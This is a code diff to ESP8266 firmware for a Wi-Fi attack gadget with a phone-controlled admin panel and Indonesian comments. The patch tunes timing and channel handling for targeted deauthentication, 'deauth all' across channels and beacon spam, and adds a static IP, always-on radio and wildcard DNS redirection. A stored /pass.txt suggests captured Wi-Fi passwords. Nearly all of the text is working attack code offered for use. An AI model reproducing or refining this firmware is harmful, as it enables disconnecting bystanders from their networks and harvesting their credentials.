@@ -20,12 +20,15 @@ String selected_ssid = "";
 uint8_t target_ch = 1;
 uint8_t admin_ch = 1; 
 
-// Tambahan buat kestabilan
 unsigned long last_attack_ms = 0;
-const int attack_delay = 100; // Jeda antar serangan biar Web Server gak mati
+const int attack_delay = 150; // Jeda sedikit lebih manusiawi buat radio
 
 ESP8266WebServer server(80);
 DNSServer dnsServer;
+
+// IP Statis biar HP lu cepet konek & gak bengong dapet IP
+IPAddress apIP(192, 168, 4, 1);
+IPAddress netMask(255, 255, 255, 0);
 
 // ================= RAW PACKETS =================
 uint8_t deauthPacket[26] = {
@@ -58,7 +61,7 @@ void spamBeacon() {
   }
 }
 
-// ================= UI ADMIN (INDEX_HTML TETAP SAMA) =================
+// ================= UI ADMIN (INDEX_HTML UTUH) =================
 const char INDEX_HTML[] PROGMEM = R"rawliteral(
 <!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>GMpro87 - Admin Panel</title>
 <style>
@@ -153,18 +156,23 @@ String processor(const String& var) {
 }
 
 void setup() {
-  Serial.begin(115200); LittleFS.begin();
+  Serial.begin(115200); 
+  LittleFS.begin();
   
+  // RESET TOTAL BIAR GAK MENTAL
+  wifi_promiscuous_enable(0);
   WiFi.disconnect();
   WiFi.softAPdisconnect(true);
-  WiFi.mode(WIFI_AP_STA);
   
-  // Paksa Admin di Channel 1
-  WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str(), 1); 
+  WiFi.mode(WIFI_AP_STA);
+  wifi_set_sleep_type(NONE_SLEEP_T); // Radio Always ON
+  
+  WiFi.softAPConfig(apIP, apIP, netMask);
+  WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str(), 1, 0, 8); 
   admin_ch = 1;
   
   dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
-  dnsServer.start(53, "*", WiFi.softAPIP());
+  dnsServer.start(53, "*", apIP);
 
   server.on("/", []() {
     if (server.hasArg("ap")) { selected_bssid = server.arg("ap"); target_ch = server.arg("ch").toInt(); selected_ssid = server.arg("ssid"); }
@@ -175,7 +183,8 @@ void setup() {
   });
 
   server.on("/scan", []() { 
-    wifi_promiscuous_enable(0); // Matikan deauth saat scan
+    deauth_running = false; rusuh_mode = false;
+    wifi_promiscuous_enable(0); 
     WiFi.scanNetworks(true, true); 
     server.sendHeader("Location", "/"); 
     server.send(302); 
@@ -204,10 +213,12 @@ void setup() {
 
   server.on("/clear", []() { LittleFS.remove("/pass.txt"); server.sendHeader("Location", "/"); server.send(302); });
   server.on("/reboot", []() { ESP.restart(); });
+  
   server.onNotFound([]() { 
     server.sendHeader("Location", "/", true); 
     server.send(302, "text/plain", ""); 
   });
+  
   server.begin();
 }
 
@@ -220,17 +231,17 @@ void loop() {
   // Logic DEAUTH TUNGGAL
   if (deauth_running && selected_bssid != "" && (current_ms - last_attack_ms > attack_delay)) {
     wifi_promiscuous_enable(1);
-    wifi_set_channel(target_ch);
+    if(wifi_get_channel() != target_ch) wifi_set_channel(target_ch);
     sendDeauth(selected_bssid);
     
-    // Kembalikan ke channel admin agar koneksi HP tidak putus
+    // Langsung balik ke admin_ch buat ngelayanin HP
     wifi_set_channel(admin_ch); 
     wifi_promiscuous_enable(0); 
     last_attack_ms = current_ms;
   }
   
   // Logic RUSUH / DEAUTH ALL
-  if ((rusuh_mode || attack_all) && (current_ms - last_attack_ms > 150)) {
+  if ((rusuh_mode || attack_all) && (current_ms - last_attack_ms > 200)) {
     wifi_promiscuous_enable(1);
     static uint8_t ch = 1;
     wifi_set_channel(ch);
@@ -242,10 +253,11 @@ void loop() {
     last_attack_ms = current_ms;
   }
   
-  if (beacon_running && (current_ms - last_attack_ms > 200)) { 
+  if (beacon_running && (current_ms - last_attack_ms > 300)) { 
     wifi_promiscuous_enable(1);
     spamBeacon(); 
     wifi_promiscuous_enable(0);
+    wifi_set_channel(admin_ch);
     last_attack_ms = current_ms;
   }
 
